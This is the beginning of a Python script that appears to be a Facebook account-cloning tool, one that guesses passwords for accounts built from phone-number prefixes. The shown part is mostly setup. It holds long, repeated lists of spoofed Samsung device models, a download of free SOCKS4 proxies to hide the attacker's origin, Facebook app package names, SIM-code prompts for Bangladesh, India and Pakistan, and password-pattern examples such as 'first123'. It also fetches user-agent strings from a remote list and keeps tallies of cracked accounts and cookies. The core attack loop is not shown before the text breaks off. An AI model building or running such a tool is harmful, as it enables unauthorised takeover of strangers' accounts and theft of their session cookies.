import os
import time
import random
import string
import re
import sys
import requests
import json
import uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool

gtxx = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
gt = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
try:
    proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    with open('socksku.txt', 'w') as f:
        f.write(proxylist)
except Exception as e:
    pass
proxsi = open('socksku.txt', 'r').read().splitlines()

B = '\x1b[1;90m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
H = '\x1b[1;93m'
BL = '\x1b[1;94m'
BG = '\x1b[1;95m'
S = '\x1b[1;96m'
W = '\x1b[1;97m'
EX = '\x1b[0m'
E = '\x1b[m'
ugen = []
ugtn = []
ugxn = []
xxxxx = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
BU = '\x1b[1;34m'
A = '\x1b[1;34m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;46m'
G1 = '\x1b[38;5;48m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
dt = '•'
id = None
ok = []
cp = []
twf = []
lop = 0
xode = []
plist = []
cpx = []
cokix = []
apkx = []
paswtrh = []
rcd = []
rcdx = []

def line():
    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

BDX = f'{A}BD SIM CODE : {G}017 015 018 019 013 016{E}{W}'
INDX = f'{R}IND SIM CODE : {G}9670 9725 8948 8795 6383{E}{W}'
PAKX = f'{G}PAK SIM CODE : {G}0306 0315 0335 0345 0318{E}{W}'
LIMITX = f'EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}'
CPG = f'[{G}~{W}] Do you went show cp account (y/n)'
CKIG = f'[{G}~{W}] Do you went show cookie (y/n)'
chc = f'{W}[{G}~{E}] Choice : {G}'
flp = f'{W}[{G}•{W}] PUT FILE PATH\x1b[1;37m : {G}'
chcps = f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}'
mxxt = f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]'
nflp = f'[{R}!{W}] FILE LOCATION NOT FOUND '

os.system('espeak -a 300 "well,come to, rudra, random, x, file, clone  , tools"')
RUDRA_POWER_OF_ID = requests.get('https://raw.githubusercontent.com/SIAM-TEAM-143/Ua1.txt/refs/heads/main/Ua-up.txt').text.splitlines()
RUDRA_UPDATE_BRO_M2 = random.choice(RUDRA_POWER_OF_ID)
loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []
plist = []
user = []
methods = []
G = '\x1b[1;32m'
W = '\x1b[1;97m'
R = '\x1b[38;5;160m'
B = '\x1b[1;90m'
Y = '\x1b[1;33m'
T = '\x1b[1;34m'
E = '\x1b[38;5;205m'
O = '\x1b[38;5;81m'
xd = f' {R}[{W}={R}]{G}'
xd1 = f' {R}[{W}1{R}]{G}'
xd2 = f' {R}[{W}2{R}]{G}'
xd0 = f' {R}[{W}0{R}]{G}'
xdx = f' {R}[{W}?{R}]{G}'
xxxxx = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
gtxx = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
gt = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 